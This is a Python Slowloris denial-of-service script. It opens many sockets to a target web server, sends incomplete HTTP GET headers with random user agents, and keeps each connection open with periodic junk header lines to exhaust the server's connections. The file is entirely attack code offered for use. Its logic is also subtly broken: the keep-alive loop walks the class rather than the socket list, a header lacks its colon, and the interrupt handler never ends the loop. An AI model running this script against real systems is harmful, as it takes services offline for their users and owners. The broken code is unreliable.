import socket
import sys
import argparse
import random
import re
from time import sleep

#arg parse stuff
argparser = argparse.ArgumentParser(prog="sloris", description="Slow Loris Attack Script")

argparser.add_argument("domain", nargs="*", type=str, help="Host")

#default 0 so the os picks the port
argparser.add_argument("-p", "--port", type=int, default=8080, help="Port")

argparser.add_argument("-a", "--alivetime", type=int, default=4, help="Keep Alive Time")

argparser.add_argument("-s", "--socket", type=int, default=200, help="# of sockets")

parser = argparser.parse_args()

#if its 1 or less then poop pants
if len(sys.argv) <= 1:
    argparser.print_help()
    sys.exit(1)

#if no domain then poop pants
if not parser.domain:
    print("need to specify a host")
    argparser.print_help()
    sys.exit(1)


#choose a random line from a file
def random_line(name):
    #choses a random line by splitting them and then choosing one
    with open(name) as f:
        lines = f.read().splitlines()
        return random.choice(lines)



#the part that does the actual logic except the arg stuff
def main():
    #matches the entire string for after the / in the domain
    extension = re.search(r"\/(.+)?", parser.domain[0])
    
    #if the extension is null then make it /
    if not extension:
        extension = "/"

    #deletes the extension and then leaves the domain
    domain = parser.domain[0].replace(extension, "")

    slist = []

    #initializes the list
    print("Socket Initialization")
    for i in range(parser.socket):
        slist.append(slsock(domain, extension))

    #actual keep alive list
    print("Sending Keep Alives")
    while True:
        try:
            for s in slsock:
                try:
                    s.keepAlive()

                except:
                    s.close()
                    slsock.remove(s)

                    print("Recreating Pooped Socket")
                    slist.append(slsock(domain, extension))


        except KeyboardInterrupt:
            print("Quiting Slow Loris")
            print("Thank You, Bye")


#decided to use a socket object in the long run because it makes it cleaner and more extendable
class slsock(object):
    #init and send for each socket
    def __init__(self, domain, extension):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #set the time out time default 4
        self.sock.settimeout(parser.alivetime)

        #no bind because you dont want the os to get confused
        self.sock.connect((domain, parser.port))

        #because of the splitting the extension will always be there
        #first line of the get request
        self.sock.send("GET {} HTTP/1.1\r\n".format(extension).encode("UTF-8"))

        #the host line
        self.sock.send("Host: {}\r\n".format(domain).encode("UTF-8"))

        #the user agent line
        #picks a random user agent and then puts it in
        self.sock.send("User-Agent: {}\r\n".format(random_line("useragents")).encode("UTF-8"))
            
        #accepted langs line
        self.sock.send("Accept-language: en-US, en\r\n".encode("UTF-8"))

    #sending the keep alives
    def keepAlive(self):
        #the line to first send the keep alive with a random time amount
        self.sock.send("X-a {}\r\n".format(random.randint(1,5000)).encode("UTF-8"))

    #closes the socket
    def close(self):
        self.sock.close()



main()


